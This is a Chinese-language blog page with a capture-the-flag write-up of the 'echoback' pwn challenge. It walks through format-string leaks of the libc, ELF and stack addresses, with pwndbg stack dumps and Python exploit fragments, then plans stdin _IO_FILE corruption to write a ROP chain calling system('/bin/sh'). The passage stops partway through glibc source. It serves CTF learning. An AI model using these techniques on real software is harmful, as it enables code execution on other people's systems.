<!DOCTYPE html><html lang="zh" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>OTHER WRITE UP FOR ME | I0gan</title><meta name="keywords" content="wp"><meta name="author" content="i0gan"><meta name="copyright" content="i0gan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="OTHER WRITE UP FOR MEechoback题目来源: World of Attack &amp; Defense checksec    Arch:     amd64-64-little     RELRO:    Full RELRO     Stack:    Canary found     NX:       NX enabled     PIE:      PIE en">
<meta property="og:type" content="article">
<meta property="og:title" content="OTHER WRITE UP FOR ME">
<meta property="og:url" content="http://blog.i0gan.cn/2020/11/08/wp-other/index.html">
<meta property="og:site_name" content="I0gan">
<meta property="og:description" content="OTHER WRITE UP FOR MEechoback题目来源: World of Attack &amp; Defense checksec    Arch:     amd64-64-little     RELRO:    Full RELRO     Stack:    Canary found     NX:       NX enabled     PIE:      PIE en">
<meta property="og:locale">
<meta property="og:image" content="http://blog.i0gan.cn/img/text_bg.jpg">
<meta property="article:published_time" content="2020-11-08T12:25:49.000Z">
<meta property="article:modified_time" content="2021-01-08T11:09:55.043Z">
<meta property="article:author" content="i0gan">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://blog.i0gan.cn/img/text_bg.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://blog.i0gan.cn/2020/11/08/wp-other/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-01-08 19:09:55'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}})()</script><meta name="generator" content="Hexo 5.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/header.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">44</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">19</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">14</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/text_bg.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">I0gan</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">OTHER WRITE UP FOR ME</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-11-08T12:25:49.000Z" title="Created 2020-11-08 20:25:49">2020-11-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-01-08T11:09:55.043Z" title="Updated 2021-01-08 19:09:55">2021-01-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="OTHER-WRITE-UP-FOR-ME"><a href="#OTHER-WRITE-UP-FOR-ME" class="headerlink" title="OTHER WRITE UP FOR ME"></a>OTHER WRITE UP FOR ME</h1><h1 id="echoback"><a href="#echoback" class="headerlink" title="echoback"></a>echoback</h1><p>题目来源: World of Attack &amp; Defense</p>
<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-bash"><code class="language-bash">    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled</code></pre>
<h2 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_B80</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span>a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  size_t nbytes<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-14h] long int</span>
  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-8h]</span>

  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbytes <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"length:"</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>nbytes <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0LL</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>nbytes <span class="token operator">></span> <span class="token number">6</span> <span class="token punctuation">)</span>
    <span class="token function">LODWORD</span><span class="token punctuation">(</span>nbytes<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//limits</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbytes <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>a1 <span class="token punctuation">)</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s say:"</span><span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"anonymous say:"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbytes <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbytes <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// fmt vum</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>明显的字符串漏洞,但是最多只允许输入7个字符.</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>通过利用字符串漏洞泄漏libc基地址, elf基地址, 修改 _IO_FILE struct,然后打入stack 中的 &amp;main ret构造rop链</p>
<h2 id="泄漏libc基址"><a href="#泄漏libc基址" class="headerlink" title="泄漏libc基址"></a>泄漏libc基址</h2><p>传入 %p调试到vfprintf函数堆栈如下:</p>
<pre><code> 0x7ffe31470828 —▸ 0x7ffe3146e250 ◂— &#39;anonymous say:&#39;
 07:0038│      0x7ffe31470830 —▸ 0x7f81d9132780 (_IO_stdfile_1_lock) ◂— 0x0
 08:0040│      0x7ffe31470838 —▸ 0x7f81d8e632c0 (__write_nocancel+7) ◂— cmp    rax, -0xfff
 09:0048│      0x7ffe31470840 —▸ 0x7f81d9339700 ◂— 0x7f81d9339700
 0a:0050│      0x7ffe31470848 ◂— 0xe
 0b:0058│      0x7ffe31470850 ◂— 0x6562b026
 0c:0060│      0x7ffe31470858 —▸ 0x7f81d91316a3 (_IO_2_1_stdout_+131) ◂— 0x132780000000000a 
 ...           ...
 28:0140│      0x7ffe31470938 ◂— 0x746df13682d53b00
 29:0148│      0x7ffe31470940 —▸ 0x562293252d30 ◂— push   r15
 2a:0150│      0x7ffe31470948 —▸ 0x7f81d8d8c830 (__libc_start_main+240) ◂— mov    edi, eax
 2b:0158│      0x7ffe31470950 —▸ 0x7ffe31470a28 —▸ 0x7ffe31470fb8
</code></pre>
<p>通过调试, 传入 %p打印时, 打印出0x7ffe31470830, 而 __libc_start_main+240 的地址在0x7ffe31470948, 调试不断加1进行核对地址,最终在 %19$p打印出libc_start_main + 240的地址.然后通过计算即可获取libc基址</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># leaking libc base</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> <span class="token string">'%19$p'</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>
    libc_start_main <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">240</span>
    libc_base <span class="token operator">=</span> libc_start_main <span class="token operator">-</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>
    li<span class="token punctuation">(</span><span class="token string">'libc_base:'</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sys_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
    sh_addr  <span class="token operator">=</span> libc_base <span class="token operator">+</span> lib<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h2 id="泄漏elf基址"><a href="#泄漏elf基址" class="headerlink" title="泄漏elf基址"></a>泄漏elf基址</h2><p>传入 %14$p查看printf函数中堆栈分布如下</p>
<pre><code>05:0028│ rdi  0x7ffc6b02ca80 ◂— 0xa7024343125 /* &#39;%14$p\n&#39; */
06:0030│      0x7ffc6b02ca88 ◂— 0xb8b63dff1d802400
07:0038│ rbp  0x7ffc6b02ca90 —▸ 0x7ffc6b02cac0 —▸ 0x55f4515b5d30 ◂— push   r15
08:0040│      0x7ffc6b02ca98 —▸ 0x55f4515b5d08 ◂— jmp    0x55f4515b5d0b
09:0048│      0x7ffc6b02caa0 —▸ 0x55f4515b5d30 ◂— push   r15
0a:0050│      0x7ffc6b02caa8 ◂— 0x200000000
0b:0058│      0x7ffc6b02cab0 ◂— 0x0
0c:0060│      0x7ffc6b02cab8 ◂— 0xb8b63dff1d802400</code></pre>
<p>打印出0x55f4515b5d30 ◂— push   r15, 而这个位置刚好在init函数的起始位置.在文件中偏移为: 0xD30 ( push    r15),这就可以计算elf的偏移了.然后获取main, pop rid的地址.</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># leaking elf base</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> <span class="token string">'%14$p'</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>
    elf_base <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xD30</span>
    main_addr <span class="token operator">=</span> elf_base <span class="token operator">+</span> <span class="token number">0xC6C</span>
    pop_rdi_ret <span class="token operator">=</span> elf_base <span class="token operator">+</span> <span class="token number">0xd93</span>
    li<span class="token punctuation">(</span><span class="token string">'elf_base:'</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>elf_base<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<h2 id="泄漏堆栈中main-ret地址"><a href="#泄漏堆栈中main-ret地址" class="headerlink" title="泄漏堆栈中main ret地址"></a>泄漏堆栈中main ret地址</h2><p>下图为printf函数中的堆栈</p>
<pre><code>pwndbg&gt; stack 100
00:0000│ rsp  0x7fffb8e184a8 —▸ 0x55ff36954c55 ◂— nop    
01:0008│      0x7fffb8e184b0 —▸ 0x55ff36954ef8 ◂— xor    ebp, dword ptr [rsi] /* &#39;3. exit&#39; */
02:0010│      0x7fffb8e184b8 —▸ 0x7fffb8e18500 ◂— 0x0
03:0018│      0x7fffb8e184c0 ◂— 0xa32 /* &#39;2\n&#39; */
04:0020│      0x7fffb8e184c8 ◂— 0x7134b9900
05:0028│ rdi  0x7fffb8e184d0 ◂— 0xa7024353125 /* &#39;%15$p\n&#39; */
06:0030│      0x7fffb8e184d8 ◂— 0xc7f0a378134b9900
07:0038│ rbp  0x7fffb8e184e0 —▸ 0x7fffb8e18510 #泄漏该地址, 获取main ret
08:0040│      0x7fffb8e184e8 —▸ 0x55ff36954d08 ◂— jmp    0x55ff36954d0b
09:0048│      0x7fffb8e184f0 —▸ 0x55ff36954d30 ◂— push   r15
0a:0050│      0x7fffb8e184f8 ◂— 0x200000000
0b:0058│      0x7fffb8e18500 ◂— 0x0
0c:0060│      0x7fffb8e18508 ◂— 0xc7f0a378134b9900
0d:0068│      0x7fffb8e18510 —▸ 0x55ff36954d30 ◂— push   r15 # main rbp
0e:0070│      0x7fffb8e18518 —▸ 0x7fa5b79af830 (__libc_start_main+240) #mian的返回地址</code></pre>
<p>以上0x7fffb8e18518就是我们要获取的main ret的堆栈地址, 在这里不能直接泄漏堆栈中的main ret地址,但可以通过泄漏 rbp地址来+8即可获取man ret.</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#leaking main ret in stack</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> <span class="token string">'%12$p'</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>
    main_ret <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x8</span></code></pre>
<h2 id="修改-IO-FILE将数据打入stack"><a href="#修改-IO-FILE将数据打入stack" class="headerlink" title="修改_IO_FILE将数据打入stack"></a>修改_IO_FILE将数据打入stack</h2><p>目前,准备工作基本完毕, 现在就是要靠修改main ret地址来劫持程序流, 但是我们想构造payload，往main_ret处写数据，但是光一个p64(main_ret)包装就占了8个字符，而我们最多允许输入7个字符，setName，它不是白放那里的，它有着重要的作用.</p>
<p>它也可以接受7个字符，我们可以把main_ret存入a1中，虽然只允许7个字符，p64()有8字节，但是末尾一般都是0，由于是低位存储，也就是数据的前导0被舍弃，没有影响，除非那个数据8字节没有前导0</p>
<p>然后，发现，%16$p输出的就是a1的数据,于是，可以先setName(p64(addr))，然后利用%16$n来对addr处写数据然而，我们这样来直接写main_ret处的数据，还是不行，因为我们构造的payload始终长度都会大于7,于是，就需要用到一个新知识了，为了绕过7个字符的限制，利用printf漏洞先去攻击scanf内部结构，然后就可以直接利用scanf往目标处输入数据，这就需要去了解scanf的源码.</p>
<h4 id="IO-FILE-struct"><a href="#IO-FILE-struct" class="headerlink" title="_IO_FILE struct"></a>_IO_FILE struct</h4><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/*
_IO_FILE *stdin = (FILE *) &amp;_IO_2_1_stdin_;    
_IO_FILE *stdout = (FILE *) &amp;_IO_2_1_stdout_;    
_IO_FILE *stderr = (FILE *) &amp;_IO_2_1_stderr_; 
*/</span>
<span class="token comment" spellcheck="true">/* The tag name of this struct is _IO_FILE to preserve historic 
   C++ mangled names for functions taking FILE* arguments. 
   That name should not be used in new code.  */</span>  
<span class="token keyword">struct</span> _IO_FILE  
<span class="token punctuation">{</span>  
  <span class="token keyword">int</span> _flags<span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">/* High-order word is _IO_MAGIC; rest is flags. */</span>  

  <span class="token comment" spellcheck="true">/* The following pointers correspond to the C++ streambuf protocol. */</span>  
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_read_ptr<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/* Current read pointer */</span>  
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_read_end<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/* End of get area. */</span>  
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_read_base<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Start of putback+get area. */</span>  
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_write_base<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Start of put area. */</span>  
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_write_ptr<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Current put pointer. */</span>  
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_write_end<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* End of put area. */</span>  
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_buf_base<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/* Start of reserve area. */</span>  
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_buf_end<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* End of reserve area. */</span>  

  <span class="token comment" spellcheck="true">/* The following fields are used to support backing up and undo. */</span>  
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_base<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Pointer to start of non-current get area. */</span>  
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_backup_base<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Pointer to first valid character of backup area */</span>  
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_end<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Pointer to end of non-current get area. */</span>  

  <span class="token keyword">struct</span> _IO_marker <span class="token operator">*</span>_markers<span class="token punctuation">;</span>  

  <span class="token keyword">struct</span> _IO_FILE <span class="token operator">*</span>_chain<span class="token punctuation">;</span>  

  <span class="token keyword">int</span> _fileno<span class="token punctuation">;</span>  
  <span class="token keyword">int</span> _flags2<span class="token punctuation">;</span>  
  __off_t _old_offset<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* This used to be _offset but it's too small.  */</span>  

  <span class="token comment" spellcheck="true">/* 1+column number of pbase(); 0 is unknown. */</span>  
  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> _cur_column<span class="token punctuation">;</span>  
  <span class="token keyword">signed</span> <span class="token keyword">char</span> _vtable_offset<span class="token punctuation">;</span>  
  <span class="token keyword">char</span> _shortbuf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  

  _IO_lock_t <span class="token operator">*</span>_lock<span class="token punctuation">;</span>  
<span class="token macro property">#<span class="token directive keyword">ifdef</span> _IO_USE_OLD_IO_FILE  </span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>  </code></pre>
<h3 id="IO-new-file-underflow"><a href="#IO-new-file-underflow" class="headerlink" title="_IO_new_file_underflow"></a>_IO_new_file_underflow</h3><p>看看文件的读取过程<strong>_IO_new_file_underflow</strong> <strong>这个函数最终调用了_IO_SYSREAD**</strong>系统调用来读取文件。在这之前，它做了一些处理**</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">_IO_new_file_underflow</span> <span class="token punctuation">(</span>FILE <span class="token operator">*</span>fp<span class="token punctuation">)</span>  
<span class="token punctuation">{</span>  
  ssize_t count<span class="token punctuation">;</span>  

  <span class="token comment" spellcheck="true">/* C99 requires EOF to be "sticky".  */</span>  
  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_EOF_SEEN<span class="token punctuation">)</span>  
    <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>  

  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_NO_READS<span class="token punctuation">)</span>  
    <span class="token punctuation">{</span>  
      fp<span class="token operator">-></span>_flags <span class="token operator">|</span><span class="token operator">=</span> _IO_ERR_SEEN<span class="token punctuation">;</span>  
      <span class="token function">__set_errno</span> <span class="token punctuation">(</span>EBADF<span class="token punctuation">)</span><span class="token punctuation">;</span>  
      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">&lt;</span> fp<span class="token operator">-></span>_IO_read_end<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//判断是否已经读完</span>
    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span>  

